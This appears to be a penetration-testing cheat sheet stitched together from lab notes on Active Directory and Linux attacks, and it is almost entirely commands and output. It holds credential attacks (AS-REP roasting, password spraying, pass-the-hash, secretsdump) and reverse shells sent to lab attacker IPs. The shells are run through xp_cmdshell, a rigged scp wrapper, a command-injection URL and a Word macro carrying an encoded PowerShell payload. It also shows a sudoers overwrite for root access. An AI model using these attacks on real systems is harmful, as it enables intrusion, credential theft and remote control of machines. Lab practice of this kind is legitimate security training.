021c31e6a6071af5149e55eaa702827d8c189118c65f6e62fd45d5aa8dc881e1358c5dde42ff88e87d67b085  
b7b731ae2adbc6743fb9679711dc434954ef5ade001d8e04b33c4a8c8d3d6c1f9938b56dc5b855e0fb62820:  
DonovanJadeKnight1
```

we have two more accounts

iis_service and backupuser

```rust
netexec rdp ips.txt -u users.txt -p password.txt
```

```rust
RDP         192.168.176.72  3389   WEB04            [+] corp.com\iis_service:Strawberry1 (Pwn3d!)
```


I was able to Asrep Roast with IIS_User
```rust
 impacket-GetNPUsers -dc-ip 192.168.176.70  -request -outputfile hashes.asreproast corp.com/iis_service
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC    
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-11-05 19:02:28.436412  0x410200



/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$dave@CORP.COM:f4cbe079bb8b5a43b993d721e8c9cd53$89dc1ac90f6641bc050639aa381924d245d7e8f6ce6b063e7a7bd160f92b5dbd216df701d56073d9538566e1f5338e80a3caa9fe53138f142751b719cb0f0c3c0ff01b918aefc69e9f7196ff935b86ec57bca27f8f6d3f7c7e3790c909be1567f18745a6fb4febea5c35ca32a011a2626f4a4397b9f3b4ff4060ec0c40d0af776a88e487d3bd4263e5d3c7bed218cc17ce988bf4b40f7d660cf95bf6e6ce6537ea56897ec33d072d3f8d9c6caf3e561359bb21dc5688b575976368bc06e3c21b3e8cffb8dc19c0b6e75b30a51da0e29e8262341c4b253b52ae2bc6287cf87617f556e2e6
```

Password cracked to Flowers1

```rust
 xfreerdp /u:dave /p:'Flowers1' /v:192.168.176.75  /dynamic-resolution
```

```rust
C:\Users\dave>net group "Domain Admins" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            backupuser               jeffadmin
The command completed successfully.
```

use winrm and access the flag


## Fuzz String

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Attacking AD Capstone > Fuzz String`

> [https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
```
${{<%[%'"}}%\.
```


## GPOs

> Source: `01101100-RUN3-00110110.md` → `PowerView > GPOs`

```
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType
```

[SharpGPOAbuse/SharpGPOAbuse-master at main · byronkg/SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
gpupdate /force
# check if added to admin
net localgroup administrators
```


## Bloodhound

> Source: `01101100-RUN3-00110110.md` → `Bloodhound`

```
certutil -urlcache -split -f http://192.168.45.171/SharpHound.ps1
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
```
```
netexec ldap nara.nara-security.com -u Tracy.White -p 'zqwj041FGX' --bloodhound -c all -ns 192.168.181.30
netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.10.184.146
```
```
sudo neo4j start
```
```
bloodhound
```
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
```
MATCH p=shortestPath((n)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC5|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor*1..]->(g:Group))
WHERE g.objectid ENDS WITH "-512" AND n<>g
RETURN p
```
💡 When all else fails - take a look at this cheat sheet SPIDER MODULE / ALL IN ONE!

[https://github.com/seriotonctf/cme-nxc-cheat-sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

```
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip 192.168.219.122
```
```
netexec smb 172.16.229.254 -u Administrator -H 'b2c03054c306ac8fc5f9d188710b0168' --local-auth
```
```
netexec smb 172.16.229.0/24 -u joe -p 'Flowers1' --continue-on-success
```
```
netexec rdp 172.16.191.0/24 -u yoshi -p 'Mushroom!' --continue-on-success
```
```
netexec winrm 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
netexec wmi 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
netexec sql 10.10.137.148 -u sql_svc -p Dolphin1

impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```
```
netexec ssh 10.10.137.148 -u sql_svc -p Dolphin1
```
```
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
```
```
impacket-psexec administrator:']12FIYiy&Frtsz'@192.168.157.122
```
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:1f006e5b3ba84ddc6690f4bb2aa559c8 Administrator@192.168.157.122
```
```
lput mimikatz.exe
lget mimikatz.log
```
```
impacket-wmiexec jim:'Castello1!'@192.168.209.189
```
```
evil-winrm -i 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
evil-winrm -i 172.16.134.7 -u 'relia.com\Administrator' -p 'vau!XCKjNQBv2$'
```
```
upload <file>
download <file>
```
```
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@192.168.219.122
```
```
impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
```

[https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)


## Downloading files

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Downloading files`

```
scp -r -i id_rsa USERZ@192.168.214.149:/path/to/file/you/want .
```

```
kali@kali:~/home/userA$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

```
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac
```

```
scp -i .ssh/id_rsa scp_wrapper.sh userA@192.168.120.29:/home/userA/
```

```
kali@kali:~$ sudo nc -nlvp 443
```

```
kali@kali:~/home/userA$ ssh -i .ssh/id_rsa userA@192.168.120.29
PTY allocation request failed on channel 0
ACCESS DENIED.
```

```
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.29] 48666
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
userA@sorcerer:~$ id
id
uid=1003(userA) gid=1003(userA) groups=1003(userA)
userA@sorcerer:~$
```


## simple-file-list

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > CMS > simple-file-list`

```
[+] simple-file-list
 | Location: http://192.168.192.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-05-17T17:12:00.000Z
 | [!] The version is out of date, the latest version is 6.1.7
```

```
https://www.exploit-db.com/exploits/48979

Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload
```


## snmp manager / linux

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > LAPSToolkit command > Command Injection > snmp manager > linux`

```
For background on this box we had a snmp manager on port 4080 using whatweb i confirmed this was linux based. Off all of this I was able to login as admin:admin just on guessing the weak creds. When I got in I looked for random files and got Manager router tab which featured a section to ping the connectivity of the routers managed.
```

```
10.1.1.95:4080/ping_router.php?cmd=192.168.0.1
```

```
10.1.1.95:4080/ping_router.php?cmd=$myip
tcpdump -i tun0 icmp
```

```
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; wget http://192.168.119.140:8000/test.html
python3 -m http.server 8000
tcpdump -i tun0 icmp
```

```
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.140",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
```


## Minitrue

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > Exploitation > Minitrue`

```
https://github.com/X0RW3LL/Minitrue
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
```

The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.

```
Create the .doc file
```

```
Use the base64 powershell code from revshells.com
```

```
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA3ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
```

```
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
```


## /usr/bin/dosbox

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/bin/dosbox`

```
DOSBox version 0.74-3
```

```
export LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo Sarge ALL=(root) NOPASSWD: ALL >>c:$LFILE"

DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/Sarge/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:/etc/sudoers
```

```
[Sarge@example ~]$ sudo -l
Runas and Command-specific defaults for Sarge:
    Defaults!/etc/ctdb/statd-callout !requiretty

User Sarge may run the following commands on example:
    (root) NOPASSWD: ALL
```

```
[Sarge@example ~]$ sudo su
[root@example Sarge]# whoami
root
```


## LAPSToolkit command

> Source: `01111110-SCR0LL-01111110.md` → `LAPSToolkit > LAPSToolkit command`

```
Get-LAPSComputers
Find-AdmPwdExtendedRights
Get-LAPSComputers
```
